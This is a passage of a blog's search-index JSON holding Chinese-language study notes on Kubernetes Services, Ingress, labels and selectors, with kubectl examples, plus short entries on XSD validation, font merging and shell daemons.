做負載平衡","uri":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/"},{"categories":["Kubernetes"],"content":"wildcard host Ingress | Kubernetes ","date":"2021-02-11","objectID":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/:6:0","tags":["Kubernetes","ingress"],"title":"Kubernetes 使用 Ingress 做負載平衡","uri":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/"},{"categories":["Kubernetes"],"content":"rewrite url ingress-nginx 中 Rewrite 的使用-阳明的博客|Kubernetes|Istio|Prometheus|Python|Golang|云原生 ","date":"2021-02-11","objectID":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/:7:0","tags":["Kubernetes","ingress"],"title":"Kubernetes 使用 Ingress 做負載平衡","uri":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/"},{"categories":["Kubernetes"],"content":"感想 之前有操作 Traefik 使用 Docker Label 讓 Traefik 可以自動抓到想要的 host 使用 Ingress 來看，這個設計能做到模組化分離，可算非常棒!! 以後有用到 Traefik Ingress 再回來填坑 ","date":"2021-02-11","objectID":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/:8:0","tags":["Kubernetes","ingress"],"title":"Kubernetes 使用 Ingress 做負載平衡","uri":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/"},{"categories":["Kubernetes"],"content":"Kubernetes Service 筆記 ","date":"2021-02-04","objectID":"/blog/posts/Kubernetes-%E6%9C%8D%E5%8B%99%E6%8E%A2%E7%B4%A2-Service-Discovery/:0:0","tags":["Kubernetes","Service"],"title":"Kubernetes 服務探索(Service Discovery)","uri":"/blog/posts/Kubernetes-%E6%9C%8D%E5%8B%99%E6%8E%A2%E7%B4%A2-Service-Discovery/"},{"categories":["Kubernetes"],"content":"抽象圖小記 graph TD subgraph Kubernetes Cluster A[Service] --\u003e N1[Nginx] A --\u003e |Endpoints|N2[Nginx] A --\u003e N3[Nginx] A --\u003e N4[Nginx] APP --\u003e|Access Service 訪問Virutal Server| A subgraph Node1 N1 N2 end subgraph Node2 N3 end subgraph Node3 N4 APP end end 簡單記錄一下，在沒有 Service，有很多服務，要怎麼分享出去使用是一個重要的課題。 不可能在程式設定多個IP，Service 透過 Virtual IP做分享內部服務。 Virtual IP 主要是做備援(HA)機制。不是在做LB。但是K8S是會做SLB。可以看相關 keepalived，利用LVS+keepalived的主從模式實現http的高可用性_實用技巧_程式人生，不過我沒有實做過。 使用上會使用DNS，${service}.${namespade}.cluster.local。 實現 VIP和 Endpoint 轉化，有: Iptable(預設) Userspace IPVS 切換方法，是透過 kube-proxy --proxy-mode做切換。 Kubernates Service Type ClusterIP NodePort Loadbalancer ExternalName Headless Kubernetes — Service Types Overview | by Ashish Patel | DevOps Mojo | Medium ","date":"2021-02-04","objectID":"/blog/posts/Kubernetes-%E6%9C%8D%E5%8B%99%E6%8E%A2%E7%B4%A2-Service-Discovery/:1:0","tags":["Kubernetes","Service"],"title":"Kubernetes 服務探索(Service Discovery)","uri":"/blog/posts/Kubernetes-%E6%9C%8D%E5%8B%99%E6%8E%A2%E7%B4%A2-Service-Discovery/"},{"categories":["Kubernetes"],"content":"ClusterIP 來源端必須屬於 Cluster 內部，內部是指「各節點與運行中的Pod」。 沒有指定type，預設是 clusterIP apiVersion: v1 kind: Service metadata: name: my-service spec: selector: app: MyApp ports: - protocol: TCP port: 80 targetPort: 9376 範例參考: Service | Kubernetes Port 對外存取的port。 targetPort pod上面的對外的 port 詳細可看:https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.19/#serviceport-v1-core ServicePort v1 core裡面有寫詳細。 ","date":"2021-02-04","objectID":"/blog/posts/Kubernetes-%E6%9C%8D%E5%8B%99%E6%8E%A2%E7%B4%A2-Service-Discovery/:1:1","tags":["Kubernetes","Service"],"title":"Kubernetes 服務探索(Service Discovery)","uri":"/blog/posts/Kubernetes-%E6%9C%8D%E5%8B%99%E6%8E%A2%E7%B4%A2-Service-Discovery/"},{"categories":["Kubernetes"],"content":"Kubernetes 元件處理 Service 流程 kubectl run alpaca-prod \\ --image=gcr.io/kuar-demo/kuard-amd64:blue \\ --port=8000 \\ --labels=\"ver=1,app=alpaca,env=prod\" # 用 expose 創建一個 service kubectl expose pod alpaca-prod # 這邊很有趣，看 kubectl describe svc alpaca-prod # 裡面 # spec: # clusterIP: 10.96.29.232 # ports: # - port: 8000 # protocol: TCP # targetPort: 8000 # selector: # app: alpaca # env: prod # ver: \"1\" #是用 selector 對應 kubectl get services -o wide # 現在 kubectl run 產生 pod ，所以應該可以不用這段 # 這段是書寫的，之後改成 deployment 再嘗試 ALPACA_POD=$(kubectl get pods -l app=alpaca \\ -o jsonpath='{.items[0].metadata.name}') # $ALPACA_POD =\u003e alapaca-pod kubectl port-forward $ALPACA_POD 48858:8080 # 執行完成可以用 localhost:48858 看到頁面 ","date":"2021-02-04","objectID":"/blog/posts/Kubernetes-%E6%9C%8D%E5%8B%99%E6%8E%A2%E7%B4%A2-Service-Discovery/:2:0","tags":["Kubernetes","Service"],"title":"Kubernetes 服務探索(Service Discovery)","uri":"/blog/posts/Kubernetes-%E6%9C%8D%E5%8B%99%E6%8E%A2%E7%B4%A2-Service-Discovery/"},{"categories":["Kubernetes"],"content":"Cluster IP Cluster IP 是虛擬 IP，通常會指定一個 DNS，通常 IP 不會更動，這樣就不會有 DNS 快取問題。 在 namespace ，我們只需要用 service 名稱連結 pod ","date":"2021-02-04","objectID":"/blog/posts/Kubernetes-%E6%9C%8D%E5%8B%99%E6%8E%A2%E7%B4%A2-Service-Discovery/:3:0","tags":["Kubernetes","Service"],"title":"Kubernetes 服務探索(Service Discovery)","uri":"/blog/posts/Kubernetes-%E6%9C%8D%E5%8B%99%E6%8E%A2%E7%B4%A2-Service-Discovery/"},{"categories":["Kubernetes"],"content":"Service DNS 用剛剛kubectl port-forward $ALPACA_POD 48858:8080 進去http://localhost:48858/裡面的DNS QUERY name 輸入 alpaca-prod就可以找到 Debugging DNS Resolution | Kubernetes alpaca-prod.default.svc.cluster.local 這邊可以看到 alpaca-prod後面 default 是 namespace 可以在 dns 搜尋 alpaca-prod.default 查詢到東西 完整的alpaca-prod.default.svc.cluster.local 也可以查詢到 ;; opcode: QUERY, status: NOERROR, id: 22467 ;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0 ;; QUESTION SECTION: ;alpaca-prod.default.svc.cluster.local. IN A ;; ANSWER SECTION: alpaca-prod.default.svc.cluster.local. 30 IN A 10.99.141.81 ","date":"2021-02-04","objectID":"/blog/posts/Kubernetes-%E6%9C%8D%E5%8B%99%E6%8E%A2%E7%B4%A2-Service-Discovery/:3:1","tags":["Kubernetes","Service"],"title":"Kubernetes 服務探索(Service Discovery)","uri":"/blog/posts/Kubernetes-%E6%9C%8D%E5%8B%99%E6%8E%A2%E7%B4%A2-Service-Discovery/"},{"categories":["Kubernetes"],"content":"Readiness Prob kubectl edit deployment/alpaca-prod 由於這邊使用 pod 會有Forbidden: pod updates may not change fields other than Kubernetes 對 Pod 的更新做了限制，除了更改 Pod 中容器（包括工作容器與初始化容器）的鏡像，以及 activeDeadlineSeconds （對 Job 類型的 Pod 定義失敗重試的最大時間）， tolerations （Pod 對污點的容忍），修改其它部分將不會產生作用，如我們可以嘗試在前面 Pod 定義文檔 pod-test.yaml 中將宿主機端口 8081 改為 8082，重新執行 kubectl apply， 將提示如下錯誤， 參考:Kubernetes筆記（五）：瞭解Pod（容器組） - 知乎 ... livenessProbe: httpGet: path: / port: 80 httpHeaders: # 此處header無意義，僅作示例 - name: purpose value: for-test initialDelaySeconds: 2 periodSeconds: 5 這邊就先不仔細研究 ","date":"2021-02-04","objectID":"/blog/posts/Kubernetes-%E6%9C%8D%E5%8B%99%E6%8E%A2%E7%B4%A2-Service-Discovery/:3:2","tags":["Kubernetes","Service"],"title":"Kubernetes 服務探索(Service Discovery)","uri":"/blog/posts/Kubernetes-%E6%9C%8D%E5%8B%99%E6%8E%A2%E7%B4%A2-Service-Discovery/"},{"categories":["Kubernetes"],"content":"用 endpoints 觀察 使用 endpint 是尋找 service 將流量發送到何處地方，這邊會抓所有pod IP收集。 kubectl get endpoints alpaca-prod --watch ","date":"2021-02-04","objectID":"/blog/posts/Kubernetes-%E6%9C%8D%E5%8B%99%E6%8E%A2%E7%B4%A2-Service-Discovery/:3:3","tags":["Kubernetes","Service"],"title":"Kubernetes 服務探索(Service Discovery)","uri":"/blog/posts/Kubernetes-%E6%9C%8D%E5%8B%99%E6%8E%A2%E7%B4%A2-Service-Discovery/"},{"categories":["Kubernetes"],"content":"NodePort ClusterIP功能都有，除了內部訪問，主機外面的 對每個節點(node)IP都可以被訪問Pod。 port: port Mapping(VIP使用) targetPort: Service 8080 to Pod :80 nodePort: Node Port 30123 to Pod :80 nodePort 範圍 default(30000~32767)，可以用 --service-node-port-range調整。 kubectl edit service alpaca-prod TYPE 改成 NodeType 這個就跟 docker 設定 port 對外很像 Name: alpaca-prod Namespace: default Labels: app=alpaca env=prod ver=1 Annotations: \u003cnone\u003e Selector: app=alpaca,env=prod,ver=1 Type: NodePort IP Families: \u003cnone\u003e IP: 10.99.141.81 IPs: \u003cnone\u003e Port: \u003cunset\u003e 8000/TCP TargetPort: 8000/TCP NodePort: \u003cunset\u003e 30306/TCP Endpoints: 10.244.0.6:8000 Session Affinity: None External Traffic Policy: Cluster Events: \u003cnone\u003e 這邊注意，由於我們使用 Kind 做測試 使用 nodePort 發現怎麼連不到 後來我注意到 node ，不應該是指操作 kubectl 主機上 面 kubectl get node -o wide 但是對 node 主機上 port 還是連不到 ssh \u003cndoe_ip\u003e -L 8080:localhost:30306 不過看來 kind 不支源使用 nodeport docker - How to use NodePort with kind? - Stack Overflow nginx - Kubernetes NodePort not listening - Stack Overflow 在考慮之後用 vagrant 環境跑跑看 ","date":"2021-02-04","objectID":"/blog/posts/Kubernetes-%E6%9C%8D%E5%8B%99%E6%8E%A2%E7%B4%A2-Service-Discovery/:4:0","tags":["Kubernetes","Service"],"title":"Kubernetes 服務探索(Service Discovery)","uri":"/blog/posts/Kubernetes-%E6%9C%8D%E5%8B%99%E6%8E%A2%E7%B4%A2-Service-Discovery/"},{"categories":["Kubernetes"],"content":"LoadBalancer 一般雲端內件有提供這個功能 但好像也能自己架 這邊就不嘗試 如何建構 Kubernetes loadbalancer – BROBRIDGE [Day12] 實作 Kubernetes 裸機 Load Balancer Part2 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 ","date":"2021-02-04","objectID":"/blog/posts/Kubernetes-%E6%9C%8D%E5%8B%99%E6%8E%A2%E7%B4%A2-Service-Discovery/:5:0","tags":["Kubernetes","Service"],"title":"Kubernetes 服務探索(Service Discovery)","uri":"/blog/posts/Kubernetes-%E6%9C%8D%E5%8B%99%E6%8E%A2%E7%B4%A2-Service-Discovery/"},{"categories":["Kubernetes"],"content":"Endpoint 創建 Service 會一同建立 Endpoint 詳細:[Kubernetes] Service Overview | 小信豬的原始部落 感覺是 Service 底層操作元件 kubectl describle endpints alpaca-prod # Name: alpaca-prod # Namespace: default # Labels: app=alpaca # env=prod # ver=1 # Annotations: \u003cnone\u003e # Subsets: # Addresses: 10.244.0.6 # NotReadyAddresses: \u003cnone\u003e # Ports: # Name Port Protocol # ---- ---- -------- # \u003cunset\u003e 8000 TCP # Events: \u003cnone\u003e kubectl get endpints alpaca-prod --watch # NAME ENDPOINTS AGE # alpaca-prod 10.244.0.6:8000 6d2h # alpaca-prod \u003cnone\u003e 6d2h \u003c-- kubectl delete pods alpaca-prod # alpaca-prod 10.244.0.7:8000 6d2h \u003c-- kubectl run alpaca-prod --image=gcr.io/kuar-demo/kuard-amd64:blue --port=8080 --labels=\"ver=1,app=alpaca,env=prod\" ","date":"2021-02-04","objectID":"/blog/posts/Kubernetes-%E6%9C%8D%E5%8B%99%E6%8E%A2%E7%B4%A2-Service-Discovery/:6:0","tags":["Kubernetes","Service"],"title":"Kubernetes 服務探索(Service Discovery)","uri":"/blog/posts/Kubernetes-%E6%9C%8D%E5%8B%99%E6%8E%A2%E7%B4%A2-Service-Discovery/"},{"categories":["Kubernetes"],"content":"建立 Service yaml apiVersion: v1 kind: Service metadata: name: my-service spec: selector: app: MyApp ports: - protocol: TCP port: 80 targetPort: 9376 簡單來說 Service 對印 selector 去抓含有 Label 的 Pod ","date":"2021-02-04","objectID":"/blog/posts/Kubernetes-%E6%9C%8D%E5%8B%99%E6%8E%A2%E7%B4%A2-Service-Discovery/:7:0","tags":["Kubernetes","Service"],"title":"Kubernetes 服務探索(Service Discovery)","uri":"/blog/posts/Kubernetes-%E6%9C%8D%E5%8B%99%E6%8E%A2%E7%B4%A2-Service-Discovery/"},{"categories":["Kubernetes"],"content":"kube-proxy kube-proxy 每一台 node 主機上面都會有這個東西。 kube-proxy 會監測 service 和 endpoint 是否發生變化，會重寫該模組 iptables 規則。 詳細: kube-proxy · Kubernetes指南 kubernetes核心组件kube-proxy - 运维笔记 - 散尽浮华 - 博客园備份圖 ","date":"2021-02-04","objectID":"/blog/posts/Kubernetes-%E6%9C%8D%E5%8B%99%E6%8E%A2%E7%B4%A2-Service-Discovery/:8:0","tags":["Kubernetes","Service"],"title":"Kubernetes 服務探索(Service Discovery)","uri":"/blog/posts/Kubernetes-%E6%9C%8D%E5%8B%99%E6%8E%A2%E7%B4%A2-Service-Discovery/"},{"categories":["Kubernetes"],"content":"Cluster IP 環境變數 kubectl exec alpaca-prod -- env # PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin # HOSTNAME=alpaca-prod # KUBERNETES_PORT_443_TCP_PROTO=tcp # ALPACA_PROD_PORT_8000_TCP_PROTO=tcp # KUBERNETES_SERVICE_HOST=10.96.0.1 # KUBERNETES_PORT=tcp://10.96.0.1:443 # KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1 # ALPACA_PROD_PORT=tcp://10.99.141.81:8000 # ALPACA_PROD_PORT_8000_TCP_PORT=8000 # KUBERNETES_SERVICE_PORT_HTTPS=443 # KUBERNETES_PORT_443_TCP_PORT=443 # ALPACA_PROD_PORT_8000_TCP=tcp://10.99.141.81:8000 # ALPACA_PROD_PORT_8000_TCP_ADDR=10.99.141.81 # KUBERNETES_SERVICE_PORT=443 # KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443 # ALPACA_PROD_SERVICE_HOST=10.99.141.81 # ALPACA_PROD_SERVICE_PORT=8000 ","date":"2021-02-04","objectID":"/blog/posts/Kubernetes-%E6%9C%8D%E5%8B%99%E6%8E%A2%E7%B4%A2-Service-Discovery/:9:0","tags":["Kubernetes","Service"],"title":"Kubernetes 服務探索(Service Discovery)","uri":"/blog/posts/Kubernetes-%E6%9C%8D%E5%8B%99%E6%8E%A2%E7%B4%A2-Service-Discovery/"},{"categories":["Kubernetes"],"content":"清除所有建立物件 # 查看之前建立有app label 的 pods , services 狀態 kubectl get pods,services -l app # 刪除 app label 物件 kubectl delete services,deployments,pods -l app ","date":"2021-02-04","objectID":"/blog/posts/Kubernetes-%E6%9C%8D%E5%8B%99%E6%8E%A2%E7%B4%A2-Service-Discovery/:10:0","tags":["Kubernetes","Service"],"title":"Kubernetes 服務探索(Service Discovery)","uri":"/blog/posts/Kubernetes-%E6%9C%8D%E5%8B%99%E6%8E%A2%E7%B4%A2-Service-Discovery/"},{"categories":["Kubernetes"],"content":"Kubernetes 的 Label 和 Annotation 小記 ","date":"2021-02-02","objectID":"/blog/posts/Kubernetes-%E7%9A%84-Label-%E5%92%8C-Annotation-%E5%B0%8F%E8%A8%98/:0:0","tags":["Kubernetes","label","annotation"],"title":"Kubernetes 的 Label 和 Annotation 小記","uri":"/blog/posts/Kubernetes-%E7%9A%84-Label-%E5%92%8C-Annotation-%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"Label ","date":"2021-02-02","objectID":"/blog/posts/Kubernetes-%E7%9A%84-Label-%E5%92%8C-Annotation-%E5%B0%8F%E8%A8%98/:1:0","tags":["Kubernetes","label","annotation"],"title":"Kubernetes 的 Label 和 Annotation 小記","uri":"/blog/posts/Kubernetes-%E7%9A%84-Label-%E5%92%8C-Annotation-%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"實作 kubectl run alpaca-prod \\ --image=gcr.io/kuar-demo/kuard-amd64:blue \\ --replicas=2 \\ # 這個已經廢棄 --labels=\"ver=1,app=alpaca,env=prod\" kubectl run alpaca-test \\ --image=gcr.io/kuar-demo/kuard-amd64:green \\ --replicas=1 \\ # 這個已經廢棄 --labels=\"ver=2,app=alpaca,env=test\" kubectl run bandicoot-prod \\ --image=gcr.io/kuar-demo/kuard-amd64:green \\ --replicas=2 \\ # 這個已經廢棄 --labels=\"ver=2,app=bandicoot,env=prod\" kubectl run bandicoot-staging \\ --image=gcr.io/kuar-demo/kuard-amd64:green \\ --replicas=1 \\ --labels=\"ver=2,app=bandicoot,env=prod\" Flag --replicas has been deprecated, has no effect and will be removed in the future. 在K8S v1.18.0 以後，–replicas已棄用 ,推薦用 deployment 創建 pods 解决k8s 1.18.0版本 replicas 被弃用问题 - 菜鸟bai - 博客园 kubectl get pods --show-labels # NAME READY STATUS RESTARTS AGE LABELS # alaca-prod 1/1 Running 0 2m46s app=alpaca,env=prod,ver=1 # alpaca-test 1/1 Running 0 2m11s app=alpaca,env=test,ver=2 # bandicoot-prod 1/1 Running 0 2m4s app=bandicoot,env=prod,ver=2 # bandicoot-staging 1/1 Running 0 117s app=bandicoot,env=prod,ver=2 Remove all the generators from kubectl run. It will now only create pods. minikube - How to start a pod in command line without deployment in kubernetes? - Stack Overflow 這邊我書上都寫 deployments 想說怎麼跟我電腦跑的結果不一樣 kubectl label pods alpaca-test \"canary=true\"  ✔  22  22:27:42 # pod/alpaca-test labeled kubectl get pods alpaca-test -L canary  ✔  23  22:28:03 # NAME READY STATUS RESTARTS AGE CANARY # alpaca-test 1/1 Running 0 12m true kubectl label podsalpaca-test \"canary-\" # pod/alpaca-test labeled ","date":"2021-02-02","objectID":"/blog/posts/Kubernetes-%E7%9A%84-Label-%E5%92%8C-Annotation-%E5%B0%8F%E8%A8%98/:1:1","tags":["Kubernetes","label","annotation"],"title":"Kubernetes 的 Label 和 Annotation 小記","uri":"/blog/posts/Kubernetes-%E7%9A%84-Label-%E5%92%8C-Annotation-%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"Label 選擇器 kubectl get pods --show-labels # NAME READY STATUS RESTARTS AGE LABELS # alaca-prod 1/1 Running 0 16m app=alpaca,env=prod,ver=1 # alpaca-test 1/1 Running 0 15m app=alpaca,env=test,ver=2 # bandicoot-prod 1/1 Running 0 15m app=bandicoot,env=prod,ver=2 # bandicoot-staging 1/1 Running 0 15m app=bandicoot,env=prod,ver=2 kubectl get pods --selector=\"ver=2\" # NAME READY STATUS RESTARTS AGE # alpaca-test 1/1 Running 0 22m # bandicoot-prod 1/1 Running 0 22m # bandicoot-staging 1/1 Running 0 22m kubectl get pods --selector=\"app=bandicoot,ver=2\" # NAME READY STATUS RESTARTS AGE # bandicoot-prod 1/1 Running 0 23m # bandicoot-staging 1/1 Running 0 23m kubectl get pods --selector=\"app in (alpaca,bandicoot)\" # NAME READY STATUS RESTARTS AGE # alpaca-prod 1/1 Running 0 4m35s # alpaca-test 1/1 Running 0 26m # bandicoot-prod 1/1 Running 0 26m # bandicoot-staging 1/1 Running 0 26m kubectl get pods --selector=\"canary\" # No resources found in default namespace. kubectl get pods --selector='!canary' # NAME READY STATUS RESTARTS AGE # alpaca-prod 1/1 Running 0 7m19s # alpaca-test 1/1 Running 0 29m # bandicoot-prod 1/1 Running 0 29m # bandicoot-staging 1/1 Running 0 29m kubectl get pods -l 'ver=2,!canary' # NAME READY STATUS RESTARTS AGE # alpaca-test 1/1 Running 0 30m # bandicoot-prod 1/1 Running 0 30m # bandicoot-staging 1/1 Running 0 30m ","date":"2021-02-02","objectID":"/blog/posts/Kubernetes-%E7%9A%84-Label-%E5%92%8C-Annotation-%E5%B0%8F%E8%A8%98/:2:0","tags":["Kubernetes","label","annotation"],"title":"Kubernetes 的 Label 和 Annotation 小記","uri":"/blog/posts/Kubernetes-%E7%9A%84-Label-%E5%92%8C-Annotation-%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"Yaml 寫 IN 方法 kubectl get pods -l ’environment in (production, qa)' selector: matchLabels: component: redis matchExpressions: - {key: tier, operator: In, values: [cache]} - {key: environment, operator: NotIn, values: [dev]} 可參考:Labels and Selectors | Kubernetes 舊版寫法(因為相容還是可以跑) selector: app: alpaca ver: 1 ","date":"2021-02-02","objectID":"/blog/posts/Kubernetes-%E7%9A%84-Label-%E5%92%8C-Annotation-%E5%B0%8F%E8%A8%98/:2:1","tags":["Kubernetes","label","annotation"],"title":"Kubernetes 的 Label 和 Annotation 小記","uri":"/blog/posts/Kubernetes-%E7%9A%84-Label-%E5%92%8C-Annotation-%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"Annotation 我看書沒特別介紹 感覺他就是Java HashMap 可以任意存任何key value 值 ... metadata: anotations: xxxx.com/url: \"http://xxxx\" ","date":"2021-02-02","objectID":"/blog/posts/Kubernetes-%E7%9A%84-Label-%E5%92%8C-Annotation-%E5%B0%8F%E8%A8%98/:3:0","tags":["Kubernetes","label","annotation"],"title":"Kubernetes 的 Label 和 Annotation 小記","uri":"/blog/posts/Kubernetes-%E7%9A%84-Label-%E5%92%8C-Annotation-%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"移除範例 pods kubectl delete pods --all delete 也可以搭配篩選器selector ","date":"2021-02-02","objectID":"/blog/posts/Kubernetes-%E7%9A%84-Label-%E5%92%8C-Annotation-%E5%B0%8F%E8%A8%98/:4:0","tags":["Kubernetes","label","annotation"],"title":"Kubernetes 的 Label 和 Annotation 小記","uri":"/blog/posts/Kubernetes-%E7%9A%84-Label-%E5%92%8C-Annotation-%E5%B0%8F%E8%A8%98/"},{"categories":["XML"],"content":"維運常常遇到 XML 裡面格式 規則不是很清楚 後來 ","date":"2021-02-02","objectID":"/blog/posts/%E7%94%A8-XSD-%E9%A9%97%E8%AD%89-XML-%E6%96%B9%E6%B3%95/:0:0","tags":["xml","xsd"],"title":"用 XSD 驗證 XML 方法","uri":"/blog/posts/%E7%94%A8-XSD-%E9%A9%97%E8%AD%89-XML-%E6%96%B9%E6%B3%95/"},{"categories":["XML"],"content":"Notepad++ 簡單好用!!目前最推薦這個方法 Validate XML with XSD in Notepad++ - YouTube ","date":"2021-02-02","objectID":"/blog/posts/%E7%94%A8-XSD-%E9%A9%97%E8%AD%89-XML-%E6%96%B9%E6%B3%95/:1:0","tags":["xml","xsd"],"title":"用 XSD 驗證 XML 方法","uri":"/blog/posts/%E7%94%A8-XSD-%E9%A9%97%E8%AD%89-XML-%E6%96%B9%E6%B3%95/"},{"categories":["XML"],"content":"VScode XML - Visual Studio Marketplace 要特別安裝Java 才能用 ","date":"2021-02-02","objectID":"/blog/posts/%E7%94%A8-XSD-%E9%A9%97%E8%AD%89-XML-%E6%96%B9%E6%B3%95/:2:0","tags":["xml","xsd"],"title":"用 XSD 驗證 XML 方法","uri":"/blog/posts/%E7%94%A8-XSD-%E9%A9%97%E8%AD%89-XML-%E6%96%B9%E6%B3%95/"},{"categories":["XML"],"content":"使用 xmllint 指令確認 xmllint -schema C0401.xsd C0401_42526317_PX91201429_20210817180616000.xml --noout 參考: linux - how to Validate a XML file with XSD through xmllint - Stack Overflow xmllint : validate an XML file against two XSD schemas (envelope / payload) - Stack Overflow ","date":"2021-02-02","objectID":"/blog/posts/%E7%94%A8-XSD-%E9%A9%97%E8%AD%89-XML-%E6%96%B9%E6%B3%95/:3:0","tags":["xml","xsd"],"title":"用 XSD 驗證 XML 方法","uri":"/blog/posts/%E7%94%A8-XSD-%E9%A9%97%E8%AD%89-XML-%E6%96%B9%E6%B3%95/"},{"categories":["XML"],"content":"找到 MIG XSD 瑞曲之聲: C# 簡易電子發票資料Turnkey交換範例 不好意思，因為沒聯絡方式，所以只好在這邊留言詢問 · Issue #1 · RichieHsu/ENVITest ENVITest/CSharp/ENVITest/EInvoiceXSD/v31 at master · RichieHsu/ENVITest 電子發票-TurnKey用XML相關參考 | 程式猿Fighting! - 點部落 ","date":"2021-02-02","objectID":"/blog/posts/%E7%94%A8-XSD-%E9%A9%97%E8%AD%89-XML-%E6%96%B9%E6%B3%95/:3:1","tags":["xml","xsd"],"title":"用 XSD 驗證 XML 方法","uri":"/blog/posts/%E7%94%A8-XSD-%E9%A9%97%E8%AD%89-XML-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"最近維運很常做造難字部份 我使用font forge 去新增字體 最近在想有沒有比較快速方法 ","date":"2021-02-02","objectID":"/blog/posts/%E5%85%A9%E5%80%8B%E5%AD%97%E5%9E%8B%E5%90%88%E4%BD%B5%E6%96%B9%E6%B3%95/:0:0","tags":["font"],"title":"兩個字型合併方法","uri":"/blog/posts/%E5%85%A9%E5%80%8B%E5%AD%97%E5%9E%8B%E5%90%88%E4%BD%B5%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"平常手動維運處理 TW-Kai-Ext-B-98_1.ttf 通常會在這邊找難字 ","date":"2021-02-02","objectID":"/blog/posts/%E5%85%A9%E5%80%8B%E5%AD%97%E5%9E%8B%E5%90%88%E4%BD%B5%E6%96%B9%E6%B3%95/:1:0","tags":["font"],"title":"兩個字型合併方法","uri":"/blog/posts/%E5%85%A9%E5%80%8B%E5%AD%97%E5%9E%8B%E5%90%88%E4%BD%B5%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"找的相關工具 有去 Github 找相關 Project … 但幾乎都失敗 所以我就不特別紀錄了 ","date":"2021-02-02","objectID":"/blog/posts/%E5%85%A9%E5%80%8B%E5%AD%97%E5%9E%8B%E5%90%88%E4%BD%B5%E6%96%B9%E6%B3%95/:2:0","tags":["font"],"title":"兩個字型合併方法","uri":"/blog/posts/%E5%85%A9%E5%80%8B%E5%AD%97%E5%9E%8B%E5%90%88%E4%BD%B5%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"script TODO: 測試 How to Merge Two Fonts in Linux – Linux Hint ","date":"2021-02-02","objectID":"/blog/posts/%E5%85%A9%E5%80%8B%E5%AD%97%E5%9E%8B%E5%90%88%E4%BD%B5%E6%96%B9%E6%B3%95/:2:1","tags":["font"],"title":"兩個字型合併方法","uri":"/blog/posts/%E5%85%A9%E5%80%8B%E5%AD%97%E5%9E%8B%E5%90%88%E4%BD%B5%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"參考來源 阿吉的部落格: 在 ABC pdf 中嵌入造字 [Font]使用者自造字(EUDC)成功轉到 PDF 的方式 | 亂馬客 - 點部落 Crystal Report轉PDF使用全字庫的難字問題~ - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 foliojs/fontkit: An advanced font engine for Node and the browser fontkit merge font - Google 搜尋 How to Merge Two Fonts in Linux – Linux Hint Merging two fonts - Super User ","date":"2021-02-02","objectID":"/blog/posts/%E5%85%A9%E5%80%8B%E5%AD%97%E5%9E%8B%E5%90%88%E4%BD%B5%E6%96%B9%E6%B3%95/:3:0","tags":["font"],"title":"兩個字型合併方法","uri":"/blog/posts/%E5%85%A9%E5%80%8B%E5%AD%97%E5%9E%8B%E5%90%88%E4%BD%B5%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"Shell 實作守護進程方法 ","date":"2021-01-28","objectID":"/blog/posts/Shell-%E5%AF%A6%E4%BD%9C%E5%AE%88%E8%AD%B7%E9%80%B2%E7%A8%8B%E6%96%B9%E6%B3%95/:0:0","tags":["shell"],"title":"Shell 實作守護進程方法","uri":"/blog/posts/Shell-%E5%AF%A6%E4%BD%9C%E5%AE%88%E8%AD%B7%E9%80%B2%E7%A8%8B%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"查詢 init.d 守護進程 Run a Java Application as a Service on Linux - Stack Overflow 迷途工程師: Init Script for OpenWrt，新增一個自己的init script init-script-template/template at master · fhd/init-script-template 上面有用 ps -p 指令 最全的Linux進程監視命令ps的30個常用例子 - 每日頭條 PHP守护进程 - InfoQ 写作平台 Linux 守护进程原理及实例（Redis、Nginx）_杨博东的博客-CSDN博客_redis守护进程 linux - Bash: wait with timeout - Stack Overflow springboot 打包（jar）部署在 Linux 環境 - SegmentFault 思否 \u003c– 覺得這個寫得很完整 ","date":"2021-01-28","objectID":"/blog/posts/Shell-%E5%AF%A6%E4%BD%9C%E5%AE%88%E8%AD%B7%E9%80%B2%E7%A8%8B%E6%96%B9%E6%B3%95/:1:0","tags":["shell"],"title":"Shell 實作守護進程方法","uri":"/blog/posts/Shell-%E5%AF%A6%E4%BD%9C%E5%AE%88%E8%AD%B7%E9%80%B2%E7%A8%8B%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"記錄網路上找的不錯寫法 